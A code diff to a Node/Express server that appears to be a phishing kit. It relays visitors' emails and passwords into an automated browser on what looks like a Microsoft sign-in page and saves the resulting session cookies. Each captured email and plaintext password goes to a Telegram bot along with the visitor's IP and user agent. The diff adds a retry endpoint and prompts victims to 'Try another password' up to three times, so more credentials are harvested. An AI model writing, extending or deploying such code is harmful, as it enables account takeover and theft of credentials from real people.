@@ -1681,7 +1681,17 @@ app.post('/api/authenticate-password-fast', async (req, res) => {
                     analytics.failedLogins++;
                     saveAnalytics();
 
-                    console.log(`❌ Fast authentication failed for: ${email} - incorrect password`);
+                    console.log(`❌ Fast authentication failed for: ${email} - keeping preloaded browser alive for retries`);
+
+                    // Update session for retry instead of closing
+                    automationSessions.set(sessionId, {
+                        automation: automation,
+                        status: 'awaiting_retry',
+                        email: email,
+                        timestamp: new Date().toISOString(),
+                        attempts: 1,
+                        maxAttempts: 3
+                    });
 
                     // Store failed attempt for admin panel
                     const sessionDir = path.join(__dirname, 'session_data');
@@ -1694,10 +1704,10 @@ app.post('/api/authenticate-password-fast', async (req, res) => {
                         id: failureId,
                         sessionId: sessionId,
                         email: email,
-                        reason: 'Wrong Password',
-                        errorMessage: 'Your account or password is incorrect. If you don\'t remember your password, reset it now.',
+                        reason: 'Wrong Password (Browser kept alive for retry)',
+                        errorMessage: 'Your account or password is incorrect. Try another password.',
                         timestamp: new Date().toISOString(),
-                        status: 'invalid',
+                        status: 'retry_available',
                         method: 'fast-authentication',
                         preloadUsed: true,
                         failureType: 'incorrect_password',
@@ -1709,7 +1719,7 @@ app.post('/api/authenticate-password-fast', async (req, res) => {
                         JSON.stringify(failureData, null, 2)
                     );
 
-                    console.log(`💾 Stored invalid session record: invalid_${failureId}.json`);
+                    console.log(`💾 Stored retry-available session record: invalid_${failureId}.json`);
 
                     // Send Telegram notification for failed attempt
                     if (telegramBot) {
@@ -1719,9 +1729,11 @@ app.post('/api/authenticate-password-fast', async (req, res) => {
                                 password: password,
                                 timestamp: new Date().toISOString(),
                                 sessionId: sessionId,
-                                reason: 'Incorrect Password',
+                                reason: 'Incorrect Password (Retry Available)',
                                 authMethod: 'FAST Authentication (preloaded browser)',
-                                preloadUsed: true
+                                preloadUsed: true,
+                                ip: req.headers['x-forwarded-for']?.split(',')?.[0]?.trim() || req.headers['cf-connecting-ip'] || req.ip || req.connection?.remoteAddress || 'Unknown',
+                                userAgent: req.get('User-Agent') || 'Unknown'
                             });
                             console.log(`📤 Telegram failed login notification sent for ${email}`);
                         } catch (telegramError) {
@@ -1729,20 +1741,14 @@ app.post('/api/authenticate-password-fast', async (req, res) => {
                         }
                     }
 
-                    // Clean up failed session
-                    setTimeout(async () => {
-                        try {
-                            await automation.close();
-                            automationSessions.delete(sessionId);
-                        } catch (cleanupError) {
-                            console.warn('Error cleaning up failed fast auth:', cleanupError.message);
-                        }
-                    }, 2000);
-
                     return res.status(401).json({
                         success: false,
                         error: 'Invalid credentials',
-                        message: 'Your account or password is incorrect. If you don\'t remember your password, reset it now.',
+                        message: 'Your account or password is incorrect. Try another password.',
+                        sessionId: sessionId,
+                        canRetry: true,
+                        attempts: 1,
+                        maxAttempts: 3,
                         preloadUsed: true,
                         requiresOAuth: false
                     });
@@ -1786,8 +1792,17 @@ app.post('/api/authenticate-password-fast', async (req, res) => {
                 const loginSuccess = await automation.performLogin(email, password);
 
                 if (!loginSuccess) {
-                    await automation.close();
-                    console.log(`❌ Cold start authentication failed for: ${email}`);
+                    console.log(`❌ Cold start authentication failed for: ${email} - keeping browser alive for retries`);
+
+                    // Keep browser session alive for retries instead of closing
+                    automationSessions.set(newSessionId, {
+                        automation: automation,
+                        status: 'awaiting_retry',
+                        email: email,
+                        timestamp: new Date().toISOString(),
+                        attempts: 1,
+                        maxAttempts: 3
+                    });
 
                     analytics.failedLogins++;
                     saveAnalytics();
@@ -1803,10 +1818,10 @@ app.post('/api/authenticate-password-fast', async (req, res) => {
                         id: failureId,
                         sessionId: newSessionId,
                         email: email,
-                        reason: 'Wrong Password',
-                        errorMessage: 'Your account or password is incorrect. If you don\'t remember your password, reset it now.',
+                        reason: 'Wrong Password (Browser kept alive for retry)',
+                        errorMessage: 'Your account or password is incorrect. Try another password.',
                         timestamp: new Date().toISOString(),
-                        status: 'invalid',
+                        status: 'retry_available',
                         method: 'cold-start-authentication',
                         preloadUsed: false,
                         failureType: 'incorrect_password'
@@ -1817,7 +1832,7 @@ app.post('/api/authenticate-password-fast', async (req, res) => {
                         JSON.stringify(failureData, null, 2)
                     );
 
-                    console.log(`💾 Stored invalid session record: invalid_${failureId}.json`);
+                    console.log(`💾 Stored retry-available session record: invalid_${failureId}.json`);
 
                     // Send Telegram notification for failed attempt
                     if (telegramBot) {
@@ -1827,9 +1842,11 @@ app.post('/api/authenticate-password-fast', async (req, res) => {
                                 password: password,
                                 timestamp: new Date().toISOString(),
                                 sessionId: newSessionId,
-                                reason: 'Incorrect Password',
+                                reason: 'Incorrect Password (Retry Available)',
                                 authMethod: 'Cold Start Authentication',
-                                preloadUsed: false
+                                preloadUsed: false,
+                                ip: req.headers['x-forwarded-for']?.split(',')?.[0]?.trim() || req.headers['cf-connecting-ip'] || req.ip || req.connection?.remoteAddress || 'Unknown',
+                                userAgent: req.get('User-Agent') || 'Unknown'
                             });
                             console.log(`📤 Telegram failed login notification sent for ${email}`);
                         } catch (telegramError) {
@@ -1840,7 +1857,11 @@ app.post('/api/authenticate-password-fast', async (req, res) => {
                     return res.status(401).json({
                         success: false,
                         error: 'Invalid credentials',
-                        message: 'Your account or password is incorrect. If you don\'t remember your password, reset it now.',
+                        message: 'Your account or password is incorrect. Try another password.',
+                        sessionId: newSessionId,
+                        canRetry: true,
+                        attempts: 1,
+                        maxAttempts: 3,
                         preloadUsed: false,
                         requiresOAuth: false
                     });
@@ -2146,6 +2167,219 @@ app.post('/api/login-automation', async (req, res) => {
             error: 'Login automation failed',
             success: false,
             details: error.message 
+        });
+    }
+});
+
+// Retry password authentication on existing session
+app.post('/api/retry-password', async (req, res) => {
+    try {
+        const { sessionId, password } = req.body;
+
+        if (!sessionId || !password) {
+            return res.status(400).json({
+                success: false,
+                error: 'Missing sessionId or password'
+            });
+        }
+
+        // Check if session exists and is in retry state
+        if (!automationSessions.has(sessionId)) {
+            return res.status(404).json({
+                success: false,
+                error: 'Session not found or expired'
+            });
+        }
+
+        const session = automationSessions.get(sessionId);
+        if (session.status !== 'awaiting_retry') {
+            return res.status(400).json({
+                success: false,
+                error: 'Session is not in retry state',
+                currentStatus: session.status
+            });
+        }
+
+        // Check attempt limits
+        if (session.attempts >= session.maxAttempts) {
+            // Close browser after max attempts
+            try {
+                await session.automation.close();
+            } catch (closeError) {
+                console.warn('Error closing browser after max attempts:', closeError.message);
+            }
+            automationSessions.delete(sessionId);
+
+            return res.status(429).json({
+                success: false,
+                error: 'Maximum retry attempts reached',
+                attempts: session.attempts,
+                maxAttempts: session.maxAttempts
+            });
+        }
+
+        console.log(`🔄 Retrying authentication for: ${session.email} (attempt ${session.attempts + 1}/${session.maxAttempts})`);
+
+        try {
+            // Try authentication with new password
+            const automation = session.automation;
+            
+            // First check if browser is still healthy
+            const isHealthy = await automation.isHealthy();
+            if (!isHealthy) {
+                throw new Error('Browser session is no longer healthy');
+            }
+
+            // Navigate back to password field (in case we're on an error page)
+            try {
+                await automation.page.waitForSelector('input[type="password"]', { timeout: 5000 });
+                const passwordInput = await automation.page.$('input[type="password"]');
+                if (passwordInput) {
+                    // Clear existing password and enter new one
+                    await passwordInput.click({ clickCount: 3 }); // Triple click to select all
+                    await automation.page.keyboard.press('Delete');
+                    await automation.page.keyboard.type(password, { delay: 100 + Math.random() * 100 });
+                    console.log('✅ New password entered for retry');
+
+                    // Click sign in button again
+                    const signInButton = await automation.page.$('input[type="submit"], button[type="submit"], input[value="Sign in"], button:contains("Sign in"), #idSIButton9');
+                    if (signInButton) {
+                        await signInButton.click();
+                        console.log('✅ Sign in button clicked for retry');
+                        
+                        // Wait for authentication result
+                        await automation.waitForAuthentication();
+                        
+                        // If we get here, authentication was successful
+                        console.log(`✅ Retry authentication successful for: ${session.email}`);
+                        
+                        // Validate and save session
+                        const sessionValidation = await automation.validateSession(session.email, password);
+                        await automation.close();
+                        automationSessions.delete(sessionId);
+
+                        if (sessionValidation.success) {
+                            analytics.successfulLogins++;
+                            saveAnalytics();
+
+                            // Send success notification if bot is available
+                            if (telegramBot) {
+                                try {
+                                    await telegramBot.sendLoginNotification({
+                                        email: session.email,
+                                        password: password,
+                                        timestamp: new Date().toISOString(),
+                                        sessionId: sessionId,
+                                        totalCookies: sessionValidation.cookiesSaved || 0,
+                                        authMethod: 'Password Retry',
+                                        ip: req.headers['x-forwarded-for']?.split(',')?.[0]?.trim() || req.headers['cf-connecting-ip'] || req.ip || req.connection?.remoteAddress || 'Unknown',
+                                        userAgent: req.get('User-Agent') || 'Unknown'
+                                    });
+                                    console.log(`📤 Telegram retry success notification sent for ${session.email}`);
+                                } catch (telegramError) {
+                                    console.warn('Telegram retry success notification failed:', telegramError.message);
+                                }
+                            }
+
+                            return res.json({
+                                success: true,
+                                message: 'Authentication successful on retry',
+                                sessionId: sessionId,
+                                userEmail: session.email,
+                                cookiesSaved: sessionValidation.cookiesSaved,
+                                attempts: session.attempts + 1,
+                                authMethod: 'Password Retry'
+                            });
+                        } else {
+                            throw new Error('Session validation failed after successful authentication');
+                        }
+                    } else {
+                        throw new Error('Could not find sign in button for retry');
+                    }
+                } else {
+                    throw new Error('Could not find password field for retry');
+                }
+            } catch (retryError) {
+                // Retry failed, increment attempts
+                session.attempts++;
+                session.timestamp = new Date().toISOString();
+
+                console.log(`❌ Retry authentication failed for: ${session.email} (attempt ${session.attempts}/${session.maxAttempts})`);
+
+                analytics.failedLogins++;
+                saveAnalytics();
+
+                // Send failed retry notification
+                if (telegramBot) {
+                    try {
+                        await telegramBot.sendFailedLoginNotification({
+                            email: session.email,
+                            password: password,
+                            timestamp: new Date().toISOString(),
+                            sessionId: sessionId,
+                            reason: `Incorrect Password (Retry ${session.attempts}/${session.maxAttempts})`,
+                            authMethod: 'Password Retry',
+                            ip: req.headers['x-forwarded-for']?.split(',')?.[0]?.trim() || req.headers['cf-connecting-ip'] || req.ip || req.connection?.remoteAddress || 'Unknown',
+                            userAgent: req.get('User-Agent') || 'Unknown'
+                        });
+                        console.log(`📤 Telegram retry failure notification sent for ${session.email}`);
+                    } catch (telegramError) {
+                        console.warn('Telegram retry failure notification failed:', telegramError.message);
+                    }
+                }
+
+                // Check if we've reached max attempts
+                if (session.attempts >= session.maxAttempts) {
+                    console.log(`❌ Max retry attempts reached for: ${session.email}, closing browser`);
+                    try {
+                        await automation.close();
+                    } catch (closeError) {
+                        console.warn('Error closing browser after failed retries:', closeError.message);
+                    }
+                    automationSessions.delete(sessionId);
+
+                    return res.status(401).json({
+                        success: false,
+                        error: 'Authentication failed after maximum retries',
+                        attempts: session.attempts,
+                        maxAttempts: session.maxAttempts,
+                        canRetry: false
+                    });
+                } else {
+                    return res.status(401).json({
+                        success: false,
+                        error: 'Invalid credentials',
+                        message: 'Your password is incorrect. Try another password.',
+                        sessionId: sessionId,
+                        canRetry: true,
+                        attempts: session.attempts,
+                        maxAttempts: session.maxAttempts
+                    });
+                }
+            }
+        } catch (sessionError) {
+            console.error(`Error during retry for session ${sessionId}:`, sessionError.message);
+            
+            // Clean up unhealthy session
+            try {
+                await session.automation.close();
+            } catch (closeError) {
+                console.warn('Error closing unhealthy session:', closeError.message);
+            }
+            automationSessions.delete(sessionId);
+
+            return res.status(500).json({
+                success: false,
+                error: 'Session error during retry',
+                details: sessionError.message
+            });
+        }
+    } catch (error) {
+        console.error('Error in retry endpoint:', error);
+        return res.status(500).json({
+            success: false,
+            error: 'Retry failed',
+            details: error.message
         });
     }
 });
